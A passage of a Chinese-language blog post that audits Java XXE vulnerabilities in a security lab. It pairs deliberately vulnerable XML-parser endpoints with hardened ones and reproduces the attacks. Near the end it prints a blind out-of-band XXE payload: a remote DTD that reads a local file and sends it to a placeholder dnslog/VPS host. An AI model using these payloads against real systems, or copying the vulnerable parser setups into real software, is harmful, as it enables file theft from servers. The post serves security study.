return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;SAXParser xxe security code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DigesterVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            Digester digester = new Digester();</span><br><span class="line">            digester.parse(new StringReader(body));  // parse xml</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Digester xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/Digester/sec&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DigesterSec(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            Digester digester = new Digester();</span><br><span class="line">            digester.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">            digester.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">            digester.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">            digester.parse(new StringReader(body));  // parse xml</span><br><span class="line"></span><br><span class="line">            return &quot;Digester xxe security code&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Use request.getInputStream to support UTF16 encoding.</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DocumentBuilderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            InputSource is = new InputSource(request.getInputStream());</span><br><span class="line">            Document document = db.parse(is);  // parse xml</span><br><span class="line"></span><br><span class="line">            // 遍历xml节点name和value</span><br><span class="line">            StringBuilder buf = new StringBuilder();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                for (int j = 0; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return buf.toString();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/DocumentBuilder/Sec&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DocumentBuilderSec(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">            dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">            dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = new StringReader(body);</span><br><span class="line">            InputSource is = new InputSource(sr);</span><br><span class="line">            db.parse(is);  // parse xml</span><br><span class="line">            sr.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;DocumentBuilder xxe security code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setXIncludeAware(true);   // 支持XInclude</span><br><span class="line">            dbf.setNamespaceAware(true);  // 支持XInclude</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = new StringReader(body);</span><br><span class="line">            InputSource is = new InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  // parse xml</span><br><span class="line"></span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            response(rootNodeList);</span><br><span class="line"></span><br><span class="line">            sr.close();</span><br><span class="line">            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/DocumentBuilder/xinclude/sec&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DocumentBuilderXincludeSec(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line"></span><br><span class="line">            dbf.setXIncludeAware(true);   // 支持XInclude</span><br><span class="line">            dbf.setNamespaceAware(true);  // 支持XInclude</span><br><span class="line">            dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">            dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">            dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line"></span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = new StringReader(body);</span><br><span class="line">            InputSource is = new InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  // parse xml</span><br><span class="line"></span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            response(rootNodeList);</span><br><span class="line"></span><br><span class="line">            sr.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;DocumentBuilder xinclude xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @PostMapping(&quot;/XMLReader/vuln&quot;)</span><br><span class="line">    public String XMLReaderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser saxParser = spf.newSAXParser();</span><br><span class="line">            XMLReader xmlReader = saxParser.getXMLReader();</span><br><span class="line">            xmlReader.parse(new InputSource(new StringReader(body)));</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;XMLReader xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @PostMapping(&quot;/XMLReader/sec&quot;)</span><br><span class="line">    public String XMLReaderSec(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser saxParser = spf.newSAXParser();</span><br><span class="line">            XMLReader xmlReader = saxParser.getXMLReader();</span><br><span class="line">            xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">            xmlReader.parse(new InputSource(new StringReader(body)));</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;XMLReader xxe security code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY；</span><br><span class="line">     * 不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。</span><br><span class="line">     */</span><br><span class="line">    @PostMapping(&quot;/DocumentHelper/vuln&quot;)</span><br><span class="line">    public String DocumentHelper(HttpServletRequest req) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(req);</span><br><span class="line">            DocumentHelper.parseText(body); // parse xml</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;DocumentHelper xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private static void response(NodeList rootNodeList)&#123;</span><br><span class="line">        for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">            Node rootNode = rootNodeList.item(i);</span><br><span class="line">            NodeList xxe = rootNode.getChildNodes();</span><br><span class="line">            for (int j = 0; j &lt; xxe.getLength(); j++) &#123;</span><br><span class="line">                Node xxeNode = xxe.item(j);</span><br><span class="line">                // 测试不能blind xxe，所以强行加了一个回显</span><br><span class="line">                logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * Receiving POST requests supporting both JSON and XML.</span><br><span class="line">         * CVE-2018-1259</span><br><span class="line">         */</span><br><span class="line">        @PostMapping(value = &quot;/xmlbeam/vuln&quot;)</span><br><span class="line">        HttpEntity&lt;String&gt; post(@RequestBody UserPayload user) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                logger.info(user.toString());</span><br><span class="line">                return ResponseEntity.ok(String.format(&quot;hello, %s!&quot;, user.getUserName()));</span><br><span class="line">            &#125;catch (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                return ResponseEntity.ok(&quot;error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload.</span><br><span class="line">         */</span><br><span class="line">        @ProjectedPayload</span><br><span class="line">        public interface UserPayload &#123;</span><br><span class="line">            @XBRead(&quot;//userName&quot;)</span><br><span class="line">            String getUserName();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="相关的包"><a href="#相关的包" class="headerlink" title="相关的包"></a>相关的包</h2><p>XMLReader</p>
+<p>SAXBuilder</p>
+<p>SAXReader</p>
+<p>SAXParserFactory</p>
+<p>Digester</p>
+<p>DocumentBuilderFactory</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>最开始我们看到的 XMLReader 代码，以及其他的 xxxReader 代码，都是不回显的，因为它们只是对内容进行了解析，但是并没有对内容进行读取与输出。</p>
+<p>因为 XML 也是反序列化的一种，<code>Runtime.getRuntime.exe()</code> 是没有回显的，如果要有回显，必须要写 <code>byte[] code = ...</code> 这样子，把最后的结果读取出来。</p>
+<h3 id="有回显的-XXE"><a href="#有回显的-XXE" class="headerlink" title="有回显的 XXE"></a>有回显的 XXE</h3><h4 id="DocumentBuilder"><a href="#DocumentBuilder" class="headerlink" title="DocumentBuilder"></a>DocumentBuilder</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">public String DocumentBuilderVuln(HttpServletRequest request) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">        DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">        InputSource is = new InputSource(request.getInputStream());</span><br><span class="line">        Document document = db.parse(is);  // parse xml</span><br><span class="line"></span><br><span class="line">        // 遍历xml节点name和value</span><br><span class="line">        StringBuilder buf = new StringBuilder();</span><br><span class="line">        NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">        for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">            Node rootNode = rootNodeList.item(i);</span><br><span class="line">            NodeList child = rootNode.getChildNodes();</span><br><span class="line">            for (int j = 0; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                Node node = child.item(j);</span><br><span class="line">                buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return buf.toString();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        return e.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/img/20250531171804209.png"></p>
+<h3 id="无回显的-XXE"><a href="#无回显的-XXE" class="headerlink" title="无回显的 XXE"></a>无回显的 XXE</h3><p>我们可以用dnslog外带出来</p>
+<p>我们先起一个vps，然后写一个1.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:/Users/guo/Desktop/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://&#123;dnslog&#125;/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>
+
+<p>ok,我们去读取这个实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line"> &lt;!ENTITY % remote SYSTEM &quot;http://&#123;vps&#125;/1.dtd&quot;&gt;</span><br><span class="line">  %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;convert&gt;&amp;exfil;&lt;/convert&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/img/20250531175531279.png"></p>
+<p>下面这些都是一样的</p>
+<p>SAXBuilder</p>
+<p>SAXReader</p>
+<p>SAXParser</p>
+<p>Digester</p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">https://drun1baby.top/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">xxe的java代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE"><span class="toc-number">1.1.</span> <span class="toc-text">项目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%8C%85"><span class="toc-number">1.2.</span> <span class="toc-text">相关的包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84-XXE"><span class="toc-number">1.3.1.</span> <span class="toc-text">有回显的 XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DocumentBuilder"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">DocumentBuilder</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84-XXE"><span class="toc-number">1.3.2.</span> <span class="toc-text">无回显的 XXE</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=xxe的java代码审计"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=xxe的java代码审计"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=xxe的java代码审计"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xxe的java代码审计&body=Check out this article: http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=xxe的java代码审计"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=xxe的java代码审计"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=xxe的java代码审计"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=xxe的java代码审计"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=xxe的java代码审计&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=xxe的java代码审计"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2003-2025
+    Mouri-Kogorou
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Writing</a></li><!--
+    --><!--
+      --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
